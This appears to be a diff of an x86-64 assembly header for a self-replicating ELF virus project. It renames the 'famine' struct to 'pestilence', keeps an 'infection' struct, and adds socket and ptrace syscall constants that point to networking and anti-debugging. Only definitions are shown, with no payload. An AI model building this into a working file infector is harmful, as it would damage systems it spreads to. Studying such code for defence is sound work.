@@ -1,55 +1,76 @@
 ; SYSCALL
+%define     SYS_READ        0
+%define     SYS_WRITE       1
 %define     SYS_OPEN        2
 %define     SYS_CLOSE       3
 %define		SYS_LSEEK		8
 %define		SYS_MMAP		9
 %define		SYS_UNMAP		11
+%define     SYS_SOCKET      41
+%define     SYS_CONNECT     42
+%define     SYS_SENDTO      44
+%define     SYS_RECVFROM    45
 %define     SYS_EXIT        60
 %define		SYS_FTRUNCATE	77
+%define		SYS_PTRACE		101
+%define		SYS_GETPPID		110
 %define     SYS_GETDENTS    217
+
+; SOCKET
+%define     AF_INET         2
+%define     SOCK_STREAM     1
 
 ; OPEN
 %define		O_RDONLY			0x0000
 %define		O_WRONLY			0x0001
 %define		O_RDWR				0x0002
 %define		O_DIRECTORY			0q0200000
+%define     O_CREAT             0x0040
 
 ; DIRENT
 %define		D_INO_OFF			0x00
+%define     D_FOLDER            0x4
 %define		D_OFF_OFF			0x08
+%define     D_REG_FILE          0x8
 %define		D_RECLEN_OFF		0x10
 %define		D_TYPE  			0x12
 %define		D_NAME  			0x13
-%define     D_REG_FILE          0x8
 
 ; MMAP
 %define		PROT_EXEC		1
 %define		PROT_READ		2
 %define		PROT_WRITE		4
 %define		MAP_SHARED		1
+%define		MAP_PRIVATE		2
+%define		MAP_ANONYMOUS   0x20
 
 ; LSEEK
 %define		SEEK_SET			0x0
 %define		SEEK_END			0x2
 
-%define		FAM(x)				[(rbp - famine_size) + x]
-%define		INF(x)				[(rbp - infection_size) + x]
-
+; PTRACE
+%define		PTRACE_TRACEME		0x0
+%define		PTRACE_DETACH		0x17
 
 %define		CODE_LEN		(_end - _start)
 %define		FINJMP_OFF		(_bf_exit - _start)
-%define		PAGE_SIZE		0x1000
+%define     PAGE_SIZE           0x1000
 
+%define		FAM(x)				[(rbp - pestilence_size) + x]
+%define		SOCK(x)				[(rbp - sock_size) + x]
+%define		INF(x)				[(rbp - infection_size) + x]
 
-struc famine
-    .pwdPtr             resq    1
-    .lenghtPwd          resq    1
-    .fd                 resq    1
+%define		CODE_LEN			(_end - _start)
+%define		FINJMP_OFF			(_bf_exit - _start)
+%define		PAGE_SIZE			0x1000
+
+struc pestilence
+    .pwd                resb    PAGE_SIZE
     .dirents:           resb    PAGE_SIZE
+    .fd                 resq    1
     .total_read:        resd    1
     .total_to_read:     resd    1
     .dirents_struct_ptr resq    1
-	.map_size	resq	1
 endstruc
 
 struc infection
@@ -121,12 +142,6 @@ struc elf64_shdr
 	.sh_info:		resd	1
 	.sh_addralign	resq	1
 	.sh_entsize		resq	1
-endstruc
-
-struc elf64_rela
-	.r_offset		resq	1
-	.r_info			resq	1
-	.r_addend		resq	1
 endstruc
 
 %macro PUSHA 0
